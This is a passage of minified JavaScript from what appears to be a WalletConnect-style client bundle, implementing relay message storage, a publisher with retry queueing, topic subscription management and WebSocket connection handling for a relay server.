        await this.core.storage.setItem(this.storageKey, Ys(U))
    }
    async setRelayerMessagesWithoutClientAck(U) {
        await this.core.storage.setItem(this.storageKeyWithoutClientAck, Ys(U))
    }
    async getRelayerMessages() {
        const U = await this.core.storage.getItem(this.storageKey);
        return typeof U < "u" ? Xs(U) : void 0
    }
    async getRelayerMessagesWithoutClientAck() {
        const U = await this.core.storage.getItem(this.storageKeyWithoutClientAck);
        return typeof U < "u" ? Xs(U) : void 0
    }
    async persist() {
        await this.setRelayerMessages(this.messages),
        await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
}
var Mn = Object.defineProperty
  , Kn = Object.defineProperties
  , Bn = Object.getOwnPropertyDescriptors
  , Ii = Object.getOwnPropertySymbols
  , Vn = Object.prototype.hasOwnProperty
  , qn = Object.prototype.propertyIsEnumerable
  , qe = (q, U, Z) => U in q ? Mn(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , Ie = (q, U) => {
    for (var Z in U || (U = {}))
        Vn.call(U, Z) && qe(q, Z, U[Z]);
    if (Ii)
        for (var Z of Ii(U))
            qn.call(U, Z) && qe(q, Z, U[Z]);
    return q
}
  , Ge = (q, U) => Kn(q, Bn(U))
  , V = (q, U, Z) => qe(q, typeof U != "symbol" ? U + "" : U, Z);
class Gn extends m$2 {
    constructor(U, Z) {
        super(U, Z),
        this.relayer = U,
        this.logger = Z,
        V(this, "events", new eventsExports.EventEmitter),
        V(this, "name", At),
        V(this, "queue", new Map),
        V(this, "publishTimeout", cjs$3.toMiliseconds(cjs$3.ONE_MINUTE)),
        V(this, "initialPublishTimeout", cjs$3.toMiliseconds(cjs$3.ONE_SECOND * 15)),
        V(this, "needsTransportRestart", !1),
        V(this, "publish", async (oe, et, st) => {
            var ws;
            this.logger.debug("Publishing Payload"),
            this.logger.trace({
                type: "method",
                method: "publish",
                params: {
                    topic: oe,
                    message: et,
                    opts: st
                }
            });
            const ms = (st == null ? void 0 : st.ttl) || je
              , Es = ea(st)
              , vs = (st == null ? void 0 : st.prompt) || !1
              , _s = (st == null ? void 0 : st.tag) || 0
              , Is = (st == null ? void 0 : st.id) || getBigIntRpcId().toString()
              , Ss = {
                topic: oe,
                message: et,
                opts: {
                    ttl: ms,
                    relay: Es,
                    prompt: vs,
                    tag: _s,
                    id: Is,
                    attestation: st == null ? void 0 : st.attestation,
                    tvf: st == null ? void 0 : st.tvf
                }
            }
              , Ts = `Failed to publish payload, please try again. id:${Is} tag:${_s}`;
            try {
                const Rs = new Promise(async Ns => {
                    const Hs = ({id: pa}) => {
                        Ss.opts.id === pa && (this.removeRequestFromQueue(pa),
                        this.relayer.events.removeListener(C.publish, Hs),
                        Ns(Ss))
                    }
                    ;
                    this.relayer.events.on(C.publish, Hs);
                    const ha = ni$1(new Promise( (pa, Zs) => {
                        this.rpcPublish({
                            topic: oe,
                            message: et,
                            ttl: ms,
                            prompt: vs,
                            tag: _s,
                            id: Is,
                            attestation: st == null ? void 0 : st.attestation,
                            tvf: st == null ? void 0 : st.tvf
                        }).then(pa).catch(Qa => {
                            this.logger.warn(Qa, Qa == null ? void 0 : Qa.message),
                            Zs(Qa)
                        }
                        )
                    }
                    ), this.initialPublishTimeout, `Failed initial publish, retrying.... id:${Is} tag:${_s}`);
                    try {
                        await ha,
                        this.events.removeListener(C.publish, Hs)
                    } catch (pa) {
                        this.queue.set(Is, Ge(Ie({}, Ss), {
                            attempt: 1
                        })),
                        this.logger.warn(pa, pa == null ? void 0 : pa.message)
                    }
                }
                );
                this.logger.trace({
                    type: "method",
                    method: "publish",
                    params: {
                        id: Is,
                        topic: oe,
                        message: et,
                        opts: st
                    }
                }),
                await ni$1(Rs, this.publishTimeout, Ts)
            } catch (Rs) {
                if (this.logger.debug("Failed to Publish Payload"),
                this.logger.error(Rs),
                (ws = st == null ? void 0 : st.internal) != null && ws.throwOnFailedPublish)
                    throw Rs
            } finally {
                this.queue.delete(Is)
            }
        }
        ),
        V(this, "on", (oe, et) => {
            this.events.on(oe, et)
        }
        ),
        V(this, "once", (oe, et) => {
            this.events.once(oe, et)
        }
        ),
        V(this, "off", (oe, et) => {
            this.events.off(oe, et)
        }
        ),
        V(this, "removeListener", (oe, et) => {
            this.events.removeListener(oe, et)
        }
        ),
        this.relayer = U,
        this.logger = E$1(Z, this.name),
        this.registerEventListeners()
    }
    get context() {
        return y$2(this.logger)
    }
    async rpcPublish(U) {
        var Z, oe, et, st;
        const {topic: ws, message: ms, ttl: Es=je, prompt: vs, tag: _s, id: Is, attestation: Ss, tvf: Ts} = U
          , Rs = {
            method: na(ea().protocol).publish,
            params: Ie({
                topic: ws,
                message: ms,
                ttl: Es,
                prompt: vs,
                tag: _s,
                attestation: Ss
            }, Ts),
            id: Is
        };
        kt$1((Z = Rs.params) == null ? void 0 : Z.prompt) && ((oe = Rs.params) == null || delete oe.prompt),
        kt$1((et = Rs.params) == null ? void 0 : et.tag) && ((st = Rs.params) == null || delete st.tag),
        this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "message",
            direction: "outgoing",
            request: Rs
        });
        const Ns = await this.relayer.request(Rs);
        return this.relayer.events.emit(C.publish, U),
        this.logger.debug("Successfully Published Payload"),
        Ns
    }
    removeRequestFromQueue(U) {
        this.queue.delete(U)
    }
    checkQueue() {
        this.queue.forEach(async (U, Z) => {
            const oe = U.attempt + 1;
            this.queue.set(Z, Ge(Ie({}, U), {
                attempt: oe
            }));
            const {topic: et, message: st, opts: ws, attestation: ms} = U;
            this.logger.warn({}, `Publisher: queue->publishing: ${U.opts.id}, tag: ${U.opts.tag}, attempt: ${oe}`),
            await this.rpcPublish(Ge(Ie({}, U), {
                topic: et,
                message: st,
                ttl: ws.ttl,
                prompt: ws.prompt,
                tag: ws.tag,
                id: ws.id,
                attestation: ms,
                tvf: ws.tvf
            })),
            this.logger.warn({}, `Publisher: queue->published: ${U.opts.id}`)
        }
        )
    }
    registerEventListeners() {
        this.relayer.core.heartbeat.on(r$1.pulse, () => {
            if (this.needsTransportRestart) {
                this.needsTransportRestart = !1,
                this.relayer.events.emit(C.connection_stalled);
                return
            }
            this.checkQueue()
        }
        ),
        this.relayer.on(C.message_ack, U => {
            this.removeRequestFromQueue(U.id.toString())
        }
        )
    }
}
var Wn = Object.defineProperty
  , Hn = (q, U, Z) => U in q ? Wn(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , ne = (q, U, Z) => Hn(q, typeof U != "symbol" ? U + "" : U, Z);
class Yn {
    constructor() {
        ne(this, "map", new Map),
        ne(this, "set", (U, Z) => {
            const oe = this.get(U);
            this.exists(U, Z) || this.map.set(U, [...oe, Z])
        }
        ),
        ne(this, "get", U => this.map.get(U) || []),
        ne(this, "exists", (U, Z) => this.get(U).includes(Z)),
        ne(this, "delete", (U, Z) => {
            if (typeof Z > "u") {
                this.map.delete(U);
                return
            }
            if (!this.map.has(U))
                return;
            const oe = this.get(U);
            if (!this.exists(U, Z))
                return;
            const et = oe.filter(st => st !== Z);
            if (!et.length) {
                this.map.delete(U);
                return
            }
            this.map.set(U, et)
        }
        ),
        ne(this, "clear", () => {
            this.map.clear()
        }
        )
    }
    get topics() {
        return Array.from(this.map.keys())
    }
}
var Jn = Object.defineProperty
  , Xn = Object.defineProperties
  , Zn = Object.getOwnPropertyDescriptors
  , Ti = Object.getOwnPropertySymbols
  , Qn = Object.prototype.hasOwnProperty
  , eo = Object.prototype.propertyIsEnumerable
  , We = (q, U, Z) => U in q ? Jn(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , ge = (q, U) => {
    for (var Z in U || (U = {}))
        Qn.call(U, Z) && We(q, Z, U[Z]);
    if (Ti)
        for (var Z of Ti(U))
            eo.call(U, Z) && We(q, Z, U[Z]);
    return q
}
  , He = (q, U) => Xn(q, Zn(U))
  , f$1 = (q, U, Z) => We(q, typeof U != "symbol" ? U + "" : U, Z);
class Ci extends P$2 {
    constructor(U, Z) {
        super(U, Z),
        this.relayer = U,
        this.logger = Z,
        f$1(this, "subscriptions", new Map),
        f$1(this, "topicMap", new Yn),
        f$1(this, "events", new eventsExports.EventEmitter),
        f$1(this, "name", Ut),
        f$1(this, "version", Ft),
        f$1(this, "pending", new Map),
        f$1(this, "cached", []),
        f$1(this, "initialized", !1),
        f$1(this, "storagePrefix", B),
        f$1(this, "subscribeTimeout", cjs$3.toMiliseconds(cjs$3.ONE_MINUTE)),
        f$1(this, "initialSubscribeTimeout", cjs$3.toMiliseconds(cjs$3.ONE_SECOND * 15)),
        f$1(this, "clientId"),
        f$1(this, "batchSubscribeTopicsLimit", 500),
        f$1(this, "init", async () => {
            this.initialized || (this.logger.trace("Initialized"),
            this.registerEventListeners(),
            await this.restore()),
            this.initialized = !0
        }
        ),
        f$1(this, "subscribe", async (oe, et) => {
            this.isInitialized(),
            this.logger.debug("Subscribing Topic"),
            this.logger.trace({
                type: "method",
                method: "subscribe",
                params: {
                    topic: oe,
                    opts: et
                }
            });
            try {
                const st = ea(et)
                  , ws = {
                    topic: oe,
                    relay: st,
                    transportType: et == null ? void 0 : et.transportType
                };
                this.pending.set(oe, ws);
                const ms = await this.rpcSubscribe(oe, st, et);
                return typeof ms == "string" && (this.onSubscribe(ms, ws),
                this.logger.debug("Successfully Subscribed Topic"),
                this.logger.trace({
                    type: "method",
                    method: "subscribe",
                    params: {
                        topic: oe,
                        opts: et
                    }
                })),
                ms
            } catch (st) {
                throw this.logger.debug("Failed to Subscribe Topic"),
                this.logger.error(st),
                st
            }
        }
        ),
        f$1(this, "unsubscribe", async (oe, et) => {
            this.isInitialized(),
            typeof (et == null ? void 0 : et.id) < "u" ? await this.unsubscribeById(oe, et.id, et) : await this.unsubscribeByTopic(oe, et)
        }
        ),
        f$1(this, "isSubscribed", oe => new Promise(et => {
            et(this.topicMap.topics.includes(oe))
        }
        )),
        f$1(this, "isKnownTopic", oe => new Promise(et => {
            et(this.topicMap.topics.includes(oe) || this.pending.has(oe) || this.cached.some(st => st.topic === oe))
        }
        )),
        f$1(this, "on", (oe, et) => {
            this.events.on(oe, et)
        }
        ),
        f$1(this, "once", (oe, et) => {
            this.events.once(oe, et)
        }
        ),
        f$1(this, "off", (oe, et) => {
            this.events.off(oe, et)
        }
        ),
        f$1(this, "removeListener", (oe, et) => {
            this.events.removeListener(oe, et)
        }
        ),
        f$1(this, "start", async () => {
            await this.onConnect()
        }
        ),
        f$1(this, "stop", async () => {
            await this.onDisconnect()
        }
        ),
        f$1(this, "restart", async () => {
            await this.restore(),
            await this.onRestart()
        }
        ),
        f$1(this, "checkPending", async () => {
            if (this.pending.size === 0 && (!this.initialized || !this.relayer.connected))
                return;
            const oe = [];
            this.pending.forEach(et => {
                oe.push(et)
            }
            ),
            await this.batchSubscribe(oe)
        }
        ),
        f$1(this, "registerEventListeners", () => {
            this.relayer.core.heartbeat.on(r$1.pulse, async () => {
                await this.checkPending()
            }
            ),
            this.events.on($$1.created, async oe => {
                const et = $$1.created;
                this.logger.info(`Emitting ${et}`),
                this.logger.debug({
                    type: "event",
                    event: et,
                    data: oe
                }),
                await this.persist()
            }
            ),
            this.events.on($$1.deleted, async oe => {
                const et = $$1.deleted;
                this.logger.info(`Emitting ${et}`),
                this.logger.debug({
                    type: "event",
                    event: et,
                    data: oe
                }),
                await this.persist()
            }
            )
        }
        ),
        this.relayer = U,
        this.logger = E$1(Z, this.name),
        this.clientId = ""
    }
    get context() {
        return y$2(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.relayer.core.customStoragePrefix + "//" + this.name
    }
    get length() {
        return this.subscriptions.size
    }
    get ids() {
        return Array.from(this.subscriptions.keys())
    }
    get values() {
        return Array.from(this.subscriptions.values())
    }
    get topics() {
        return this.topicMap.topics
    }
    get hasAnyTopics() {
        return this.topicMap.topics.length > 0 || this.pending.size > 0 || this.cached.length > 0 || this.subscriptions.size > 0
    }
    hasSubscription(U, Z) {
        let oe = !1;
        try {
            oe = this.getSubscription(U).topic === Z
        } catch {}
        return oe
    }
    reset() {
        this.cached = [],
        this.initialized = !0
    }
    onDisable() {
        this.values.length > 0 && (this.cached = this.values),
        this.subscriptions.clear(),
        this.topicMap.clear()
    }
    async unsubscribeByTopic(U, Z) {
        const oe = this.topicMap.get(U);
        await Promise.all(oe.map(async et => await this.unsubscribeById(U, et, Z)))
    }
    async unsubscribeById(U, Z, oe) {
        this.logger.debug("Unsubscribing Topic"),
        this.logger.trace({
            type: "method",
            method: "unsubscribe",
            params: {
                topic: U,
                id: Z,
                opts: oe
            }
        });
        try {
            const et = ea(oe);
            await this.restartToComplete({
                topic: U,
                id: Z,
                relay: et
            }),
            await this.rpcUnsubscribe(U, Z, et);
            const st = Kt$1("USER_DISCONNECTED", `${this.name}, ${U}`);
            await this.onUnsubscribe(U, Z, st),
            this.logger.debug("Successfully Unsubscribed Topic"),
            this.logger.trace({
                type: "method",
                method: "unsubscribe",
                params: {
                    topic: U,
                    id: Z,
                    opts: oe
                }
            })
        } catch (et) {
            throw this.logger.debug("Failed to Unsubscribe Topic"),
            this.logger.error(et),
            et
        }
    }
    async rpcSubscribe(U, Z, oe) {
        var et;
        (!oe || (oe == null ? void 0 : oe.transportType) === Q.relay) && await this.restartToComplete({
            topic: U,
            id: U,
            relay: Z
        });
        const st = {
            method: na(Z.protocol).subscribe,
            params: {
                topic: U
            }
        };
        this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "outgoing",
            request: st
        });
        const ws = (et = oe == null ? void 0 : oe.internal) == null ? void 0 : et.throwOnFailedPublish;
        try {
            const ms = await this.getSubscriptionId(U);
            if ((oe == null ? void 0 : oe.transportType) === Q.link_mode)
                return setTimeout( () => {
                    (this.relayer.connected || this.relayer.connecting) && this.relayer.request(st).catch(_s => this.logger.warn(_s))
                }
                , cjs$3.toMiliseconds(cjs$3.ONE_SECOND)),
                ms;
            const Es = new Promise(async _s => {
                const Is = Ss => {
                    Ss.topic === U && (this.events.removeListener($$1.created, Is),
                    _s(Ss.id))
                }
                ;
                this.events.on($$1.created, Is);
                try {
                    const Ss = await ni$1(new Promise( (Ts, Rs) => {
                        this.relayer.request(st).catch(Ns => {
                            this.logger.warn(Ns, Ns == null ? void 0 : Ns.message),
                            Rs(Ns)
                        }
                        ).then(Ts)
                    }
                    ), this.initialSubscribeTimeout, `Subscribing to ${U} failed, please try again`);
                    this.events.removeListener($$1.created, Is),
                    _s(Ss)
                } catch {}
            }
            )
              , vs = await ni$1(Es, this.subscribeTimeout, `Subscribing to ${U} failed, please try again`);
            if (!vs && ws)
                throw new Error(`Subscribing to ${U} failed, please try again`);
            return vs ? ms : null
        } catch (ms) {
            if (this.logger.debug("Outgoing Relay Subscribe Payload stalled"),
            this.relayer.events.emit(C.connection_stalled),
            ws)
                throw ms
        }
        return null
    }
    async rpcBatchSubscribe(U) {
        if (!U.length)
            return;
        const Z = U[0].relay
          , oe = {
            method: na(Z.protocol).batchSubscribe,
            params: {
                topics: U.map(et => et.topic)
            }
        };
        this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "outgoing",
            request: oe
        });
        try {
            await await ni$1(new Promise(et => {
                this.relayer.request(oe).catch(st => this.logger.warn(st)).then(et)
            }
            ), this.subscribeTimeout, "rpcBatchSubscribe failed, please try again")
        } catch {
            this.relayer.events.emit(C.connection_stalled)
        }
    }
    async rpcBatchFetchMessages(U) {
        if (!U.length)
            return;
        const Z = U[0].relay
          , oe = {
            method: na(Z.protocol).batchFetchMessages,
            params: {
                topics: U.map(st => st.topic)
            }
        };
        this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "outgoing",
            request: oe
        });
        let et;
        try {
            et = await await ni$1(new Promise( (st, ws) => {
                this.relayer.request(oe).catch(ms => {
                    this.logger.warn(ms),
                    ws(ms)
                }
                ).then(st)
            }
            ), this.subscribeTimeout, "rpcBatchFetchMessages failed, please try again")
        } catch {
            this.relayer.events.emit(C.connection_stalled)
        }
        return et
    }
    rpcUnsubscribe(U, Z, oe) {
        const et = {
            method: na(oe.protocol).unsubscribe,
            params: {
                topic: U,
                id: Z
            }
        };
        return this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "outgoing",
            request: et
        }),
        this.relayer.request(et)
    }
    onSubscribe(U, Z) {
        this.setSubscription(U, He(ge({}, Z), {
            id: U
        })),
        this.pending.delete(Z.topic)
    }
    onBatchSubscribe(U) {
        U.length && U.forEach(Z => {
            this.setSubscription(Z.id, ge({}, Z)),
            this.pending.delete(Z.topic)
        }
        )
    }
    async onUnsubscribe(U, Z, oe) {
        this.events.removeAllListeners(Z),
        this.hasSubscription(Z, U) && this.deleteSubscription(Z, oe),
        await this.relayer.messages.del(U)
    }
    async setRelayerSubscriptions(U) {
        await this.relayer.core.storage.setItem(this.storageKey, U)
    }
    async getRelayerSubscriptions() {
        return await this.relayer.core.storage.getItem(this.storageKey)
    }
    setSubscription(U, Z) {
        this.logger.debug("Setting subscription"),
        this.logger.trace({
            type: "method",
            method: "setSubscription",
            id: U,
            subscription: Z
        }),
        this.addSubscription(U, Z)
    }
    addSubscription(U, Z) {
        this.subscriptions.set(U, ge({}, Z)),
        this.topicMap.set(Z.topic, U),
        this.events.emit($$1.created, Z)
    }
    getSubscription(U) {
        this.logger.debug("Getting subscription"),
        this.logger.trace({
            type: "method",
            method: "getSubscription",
            id: U
        });
        const Z = this.subscriptions.get(U);
        if (!Z) {
            const {message: oe} = Et$2("NO_MATCHING_KEY", `${this.name}: ${U}`);
            throw new Error(oe)
        }
        return Z
    }
    deleteSubscription(U, Z) {
        this.logger.debug("Deleting subscription"),
        this.logger.trace({
            type: "method",
            method: "deleteSubscription",
            id: U,
            reason: Z
        });
        const oe = this.getSubscription(U);
        this.subscriptions.delete(U),
        this.topicMap.delete(oe.topic, U),
        this.events.emit($$1.deleted, He(ge({}, oe), {
            reason: Z
        }))
    }
    async persist() {
        await this.setRelayerSubscriptions(this.values),
        this.events.emit($$1.sync)
    }
    async onRestart() {
        if (this.cached.length) {
            const U = [...this.cached]
              , Z = Math.ceil(this.cached.length / this.batchSubscribeTopicsLimit);
            for (let oe = 0; oe < Z; oe++) {
                const et = U.splice(0, this.batchSubscribeTopicsLimit);
                await this.batchSubscribe(et)
            }
        }
        this.events.emit($$1.resubscribed)
    }
    async restore() {
        try {
            const U = await this.getRelayerSubscriptions();
            if (typeof U > "u" || !U.length)
                return;
            if (this.subscriptions.size) {
                const {message: Z} = Et$2("RESTORE_WILL_OVERRIDE", this.name);
                throw this.logger.error(Z),
                this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),
                new Error(Z)
            }
            this.cached = U,
            this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),
            this.logger.trace({
                type: "method",
                method: "restore",
                subscriptions: this.values
            })
        } catch (U) {
            this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),
            this.logger.error(U)
        }
    }
    async batchSubscribe(U) {
        U.length && (await this.rpcBatchSubscribe(U),
        this.onBatchSubscribe(await Promise.all(U.map(async Z => He(ge({}, Z), {
            id: await this.getSubscriptionId(Z.topic)
        })))))
    }
    async batchFetchMessages(U) {
        if (!U.length)
            return;
        this.logger.trace(`Fetching batch messages for ${U.length} subscriptions`);
        const Z = await this.rpcBatchFetchMessages(U);
        Z && Z.messages && (await pi$1(cjs$3.toMiliseconds(cjs$3.ONE_SECOND)),
        await this.relayer.handleBatchMessageEvents(Z.messages))
    }
    async onConnect() {
        await this.restart(),
        this.reset()
    }
    onDisconnect() {
        this.onDisable()
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
    async restartToComplete(U) {
        !this.relayer.connected && !this.relayer.connecting && (this.cached.push(U),
        await this.relayer.transportOpen())
    }
    async getClientId() {
        return this.clientId || (this.clientId = await this.relayer.core.crypto.getClientId()),
        this.clientId
    }
    async getSubscriptionId(U) {
        return zc(U + await this.getClientId())
    }
}
var to = Object.defineProperty
  , Pi = Object.getOwnPropertySymbols
  , io = Object.prototype.hasOwnProperty
  , so = Object.prototype.propertyIsEnumerable
  , Ye = (q, U, Z) => U in q ? to(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , Si = (q, U) => {
    for (var Z in U || (U = {}))
        io.call(U, Z) && Ye(q, Z, U[Z]);
    if (Pi)
        for (var Z of Pi(U))
            so.call(U, Z) && Ye(q, Z, U[Z]);
    return q
}
  , y = (q, U, Z) => Ye(q, typeof U != "symbol" ? U + "" : U, Z);
class Oi extends d$1 {
    constructor(U) {
        super(U),
        y(this, "protocol", "wc"),
        y(this, "version", 2),
        y(this, "core"),
        y(this, "logger"),
        y(this, "events", new eventsExports.EventEmitter),
        y(this, "provider"),
        y(this, "messages"),
        y(this, "subscriber"),
        y(this, "publisher"),
        y(this, "name", $t),
        y(this, "transportExplicitlyClosed", !1),
        y(this, "initialized", !1),
        y(this, "connectionAttemptInProgress", !1),
        y(this, "relayUrl"),
        y(this, "projectId"),
        y(this, "packageName"),
        y(this, "bundleId"),
        y(this, "hasExperiencedNetworkDisruption", !1),
        y(this, "pingTimeout"),
        y(this, "heartBeatTimeout", cjs$3.toMiliseconds(cjs$3.THIRTY_SECONDS + cjs$3.FIVE_SECONDS)),
        y(this, "reconnectTimeout"),
        y(this, "connectPromise"),
        y(this, "reconnectInProgress", !1),
        y(this, "requestsInFlight", []),
        y(this, "connectTimeout", cjs$3.toMiliseconds(cjs$3.ONE_SECOND * 15)),
        y(this, "request", async Z => {
            var oe, et;
            this.logger.debug("Publishing Request Payload");
            const st = Z.id || getBigIntRpcId().toString();
            await this.toEstablishConnection();
            try {
                this.logger.trace({
                    id: st,
                    method: Z.method,
                    topic: (oe = Z.params) == null ? void 0 : oe.topic
                }, "relayer.request - publishing...");
                const ws = `${st}:${((et = Z.params) == null ? void 0 : et.tag) || ""}`;
                this.requestsInFlight.push(ws);
                const ms = await this.provider.request(Z);
                return this.requestsInFlight = this.requestsInFlight.filter(Es => Es !== ws),
                ms
            } catch (ws) {
                throw this.logger.debug(`Failed to Publish Request: ${st}`),
                ws
            }
        }
        ),
        y(this, "resetPingTimeout", () => {
            Ye$1() && (clearTimeout(this.pingTimeout),
            this.pingTimeout = setTimeout( () => {
                var Z, oe, et, st;
                try {
                    this.logger.debug({}, "pingTimeout: Connection stalled, terminating..."),
                    (st = (et = (oe = (Z = this.provider) == null ? void 0 : Z.connection) == null ? void 0 : oe.socket) == null ? void 0 : et.terminate) == null || st.call(et)
                } catch (ws) {
                    this.logger.warn(ws, ws == null ? void 0 : ws.message)
                }
            }
            , this.heartBeatTimeout))
        }
        ),
        y(this, "onPayloadHandler", Z => {
            this.onProviderPayload(Z),
            this.resetPingTimeout()
        }
        ),
        y(this, "onConnectHandler", () => {
            this.logger.warn({}, "Relayer connected 🛜"),
            this.startPingTimeout(),
            this.events.emit(C.connect)
        }
        ),
        y(this, "onDisconnectHandler", () => {
            this.logger.warn({}, "Relayer disconnected 🛑"),
            this.requestsInFlight = [],
            this.onProviderDisconnect()
        }
        ),
        y(this, "onProviderErrorHandler", Z => {
            this.logger.fatal(`Fatal socket error: ${Z.message}`),
            this.events.emit(C.error, Z),
            this.logger.fatal("Fatal socket error received, closing transport"),
            this.transportClose()
        }
        ),
        y(this, "registerProviderListeners", () => {
            this.provider.on(L.payload, this.onPayloadHandler),
            this.provider.on(L.connect, this.onConnectHandler),
            this.provider.on(L.disconnect, this.onDisconnectHandler),
            this.provider.on(L.error, this.onProviderErrorHandler)
        }
        ),
        this.core = U.core,
        this.logger = typeof U.logger < "u" && typeof U.logger != "string" ? E$1(U.logger, this.name) : Vt$3(k$3({
            level: U.logger || Nt
        })),
        this.messages = new Ei(this.logger,U.core),
        this.subscriber = new Ci(this,this.logger),
        this.publisher = new Gn(this,this.logger),
        this.relayUrl = (U == null ? void 0 : U.relayUrl) || Ue,
        this.projectId = U.projectId,
        Ms$1() ? this.packageName = qs() : Vs$1() && (this.bundleId = qs()),
        this.provider = {}
    }
    async init() {
        this.logger.trace("Initialized"),
        this.registerEventListeners(),
        await Promise.all([this.messages.init(), this.subscriber.init()]),
        this.initialized = !0,
        this.transportOpen().catch(U => this.logger.warn(U, U == null ? void 0 : U.message))
    }
    get context() {
        return y$2(this.logger)
    }
    get connected() {
        var U, Z, oe;
        return ((oe = (Z = (U = this.provider) == null ? void 0 : U.connection) == null ? void 0 : Z.socket) == null ? void 0 : oe.readyState) === 1 || !1
    }
    get connecting() {
        var U, Z, oe;
        return ((oe = (Z = (U = this.provider) == null ? void 0 : U.connection) == null ? void 0 : Z.socket) == null ? void 0 : oe.readyState) === 0 || this.connectPromise !== void 0 || !1
    }
    async publish(U, Z, oe) {
        this.isInitialized(),
        await this.publisher.publish(U, Z, oe),
        await this.recordMessageEvent({
            topic: U,
            message: Z,
            publishedAt: Date.now(),
            transportType: Q.relay
        }, le.outbound)
    }
    async subscribe(U, Z) {
        var oe, et, st;
        this.isInitialized(),
        (!(Z != null && Z.transportType) || (Z == null ? void 0 : Z.transportType) === "relay") && await this.toEstablishConnection();
        const ws = typeof ((oe = Z == null ? void 0 : Z.internal) == null ? void 0 : oe.throwOnFailedPublish) > "u" ? !0 : (et = Z == null ? void 0 : Z.internal) == null ? void 0 : et.throwOnFailedPublish;
        let ms = ((st = this.subscriber.topicMap.get(U)) == null ? void 0 : st[0]) || "", Es;
        const vs = _s => {
            _s.topic === U && (this.subscriber.off($$1.created, vs),
            Es())
        }
        ;
        return await Promise.all([new Promise(_s => {
            Es = _s,
            this.subscriber.on($$1.created, vs)
        }
        ), new Promise(async (_s, Is) => {
            ms = await this.subscriber.subscribe(U, Si({
                internal: {
                    throwOnFailedPublish: ws
                }
            }, Z)).catch(Ss => {
                ws && Is(Ss)
            }
            ) || ms,
            _s()
        }
        )]),
        ms
    }
    async unsubscribe(U, Z) {
        this.isInitialized(),
        await this.subscriber.unsubscribe(U, Z)
    }
    on(U, Z) {
        this.events.on(U, Z)
    }
    once(U, Z) {
        this.events.once(U, Z)
    }
    off(U, Z) {
        this.events.off(U, Z)
    }
    removeListener(U, Z) {
        this.events.removeListener(U, Z)
    }
    async transportDisconnect() {
        this.provider.disconnect && (this.hasExperiencedNetworkDisruption || this.connected) ? await ni$1(this.provider.disconnect(), 2e3, "provider.disconnect()").catch( () => this.onProviderDisconnect()) : this.onProviderDisconnect()
    }
    async transportClose() {
        this.transportExplicitlyClosed = !0,
        await this.transportDisconnect()
    }
    async transportOpen(U) {
        if (!this.subscriber.hasAnyTopics) {
            this.logger.warn("Starting WS connection skipped because the client has no topics to work with.");
            return
        }
        if (this.connectPromise ? (this.logger.debug({}, "Waiting for existing connection attempt to resolve..."),
        await this.connectPromise,
        this.logger.debug({}, "Existing connection attempt resolved")) : (this.connectPromise = new Promise(async (Z, oe) => {
            await this.connect(U).then(Z).catch(oe).finally( () => {
                this.connectPromise = void 0
            }
            )
        }
        ),
        await this.connectPromise),
        !this.connected)
            throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)
    }
    async restartTransport(U) {
        this.logger.debug({}, "Restarting transport..."),
        !this.connectionAttemptInProgress && (this.relayUrl = U || this.relayUrl,
        await this.confirmOnlineStateOrThrow(),
        await this.transportClose(),
        await this.transportOpen())
    }
    async confirmOnlineStateOrThrow() {
        if (!await ja())
            throw new Error("No internet connection detected. Please restart your network and try again.")
    }
    async handleBatchMessageEvents(U) {
        if ((U == null ? void 0 : U.length) === 0) {
            this.logger.trace("Batch message events is empty. Ignoring...");
            return
        }
        const Z = U.sort( (oe, et) => oe.publishedAt - et.publishedAt);
        this.logger.debug(`Batch of ${Z.length} message events sorted`);
        for (const oe of Z)
            try {
                await this.onMessageEvent(oe)
            } catch (et) {
                this.logger.warn(et, "Error while processing batch message event: " + (et == null ? void 0 : et.message))
            }
        this.logger.trace(`Batch of ${Z.length} message events processed`)
    }
    async onLinkMessageEvent(U, Z) {
        const {topic: oe} = U;
        if (!Z.sessionExists) {
            const et = ii$1(cjs$3.FIVE_MINUTES)
              , st = {
                topic: oe,
                expiry: et,
                relay: {
                    protocol: "irn"
                },
                active: !1
            };
            await this.core.pairing.pairings.set(oe, st)
        }
        this.events.emit(C.message, U),
        await this.recordMessageEvent(U, le.inbound)
    }
    async connect(U) {
        await this.confirmOnlineStateOrThrow(),
        U && U !== this.relayUrl && (this.relayUrl = U,
        await this.transportDisconnect()),
        this.connectionAttemptInProgress = !0,
        this.transportExplicitlyClosed = !1;
        let Z = 1;
        for (; Z < 6; ) {
            try {
                if (this.transportExplicitlyClosed)
                    break;
                this.logger.debug({}, `Connecting to ${this.relayUrl}, attempt: ${Z}...`),
                await this.createProvider(),
                await new Promise(async (oe, et) => {
                    const st = () => {
                        et(new Error("Connection interrupted while trying to connect"))
                    }
                    ;
                    this.provider.once(L.disconnect, st),
                    await ni$1(new Promise( (ws, ms) => {
                        this.provider.connect().then(ws).catch(ms)
                    }
                    ), this.connectTimeout, `Socket stalled when trying to connect to ${this.relayUrl}`).catch(ws => {
                        et(ws)
                    }
                    ).finally( () => {
                        this.provider.off(L.disconnect, st),
                        clearTimeout(this.reconnectTimeout)
                    }
                    ),
                    await new Promise(async (ws, ms) => {
                        const Es = () => {
                            et(new Error("Connection interrupted while trying to subscribe"))
                        }
                        ;
                        this.provider.once(L.disconnect, Es),
